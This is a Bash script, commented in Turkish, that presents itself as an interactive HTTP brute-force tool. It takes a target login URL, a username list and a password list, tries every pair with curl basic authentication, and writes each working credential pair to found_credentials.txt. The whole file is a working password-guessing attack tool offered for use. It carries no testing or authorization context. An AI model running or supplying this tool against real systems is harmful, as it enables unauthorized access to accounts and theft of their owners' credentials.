#!/bin/bash

# Renk kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Banner
clear
echo -e "${YELLOW}"
echo "  _    _           _       _____             _"
echo " | |  | |         | |     |  __ \           | |"
echo " | |__| |_   _  __| |_ __ | |__) |___  _   _| |_ ___"
echo " |  __  | | | |/ _\` | '_ \|  _  // _ \| | | | __/ _ \"
echo " | |  | | |_| | (_| | | | | | \ \ (_) | |_| | ||  __/"
echo " |_|  |_|\__,_|\__,_|_| |_|_|  \_\___/ \__,_|\__\___|"
echo -e "${NC}"
echo "Interactive HTTP Brute-Force Aracı"
echo ""

# Kullanıcı girişlerini alma
read -p "Hedef URL (örn: http://site.com/login): " URL
read -p "Kullanıcı listesi dosya yolu: " USER_FILE
read -p "Parola listesi dosya yolu: " PASS_FILE
read -p "Başarı kriteri (HTTP status code, örn: 200): " SUCCESS_CODE
read -p "Hız (delay in saniye, 0 için enter): " DELAY
DELAY=${DELAY:-0}

# Dosyaların var olduğunu kontrol et
if [ ! -f "$USER_FILE" ]; then
    echo -e "${RED}Hata: Kullanıcı listesi dosyası bulunamadı: $USER_FILE${NC}"
    exit 1
fi

if [ ! -f "$PASS_FILE" ]; then
    echo -e "${RED}Hata: Parola listesi dosyası bulunamadı: $PASS_FILE${NC}"
    exit 1
fi

# İstatistikler
TOTAL_USERS=$(wc -l < "$USER_FILE")
TOTAL_PASSWORDS=$(wc -l < "$PASS_FILE")
TOTAL_ATTEMPTS=$((TOTAL_USERS * TOTAL_PASSWORDS))
ATTEMPT=0
FOUND=0

echo -e "\n${YELLOW}[*] Saldırı başlatılıyor...${NC}"
echo "[*] Hedef: $URL"
echo "[*] Başarı kodu: $SUCCESS_CODE"
echo "[*] Kullanıcı sayısı: $TOTAL_USERS"
echo "[*] Parola sayısı: $TOTAL_PASSWORDS"
echo "[*] Toplam deneme: $TOTAL_ATTEMPTS"
echo "[*] Gecikme: $DELAY saniye"
echo ""

START_TIME=$(date +%s)

# Brute-force döngüsü
while IFS= read -r user; do
    while IFS= read -r pass; do
        ATTEMPT=$((ATTEMPT + 1))
        
        # İlerlemeyi göster
        PERCENTAGE=$((ATTEMPT * 100 / TOTAL_ATTEMPTS))
        echo -ne "[*] Denenen: $user:$pass - İlerleme: $PERCENTAGE% - $FOUND bulundu\r"
        
        # HTTP isteği gönder
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" "$URL")
        
        # Başarılı giriş kontrolü
        if [ "$RESPONSE" -eq "$SUCCESS_CODE" ]; then
            echo -e "\n${GREEN}[+] Başarılı giriş!${NC} Kullanıcı: $user - Parola: $pass"
            FOUND=$((FOUND + 1))
            # Bulunanları dosyaya yaz
            echo "$user:$pass" >> found_credentials.txt
        fi
        
        # Belirtilen gecikmeyi uygula
        sleep "$DELAY"
        
    done < "$PASS_FILE"
done < "$USER_FILE"

END_TIME=$(date +%s)
ELAPSED_TIME=$((END_TIME - START_TIME))

echo -e "\n${YELLOW}[*] Saldırı tamamlandı${NC}"
echo "[*] Geçen süre: $ELAPSED_TIME saniye"
echo "[*] Toplam deneme: $ATTEMPT"
echo "[*] Bulunan kimlik bilgisi: $FOUND"

if [ "$FOUND" -gt 0 ]; then
    echo "[*] Bulunanlar 'found_credentials.txt' dosyasına kaydedildi"
else
    echo -e "${RED}[-] Hiçbir kimlik bilgisi bulunamadı${NC}"
fi
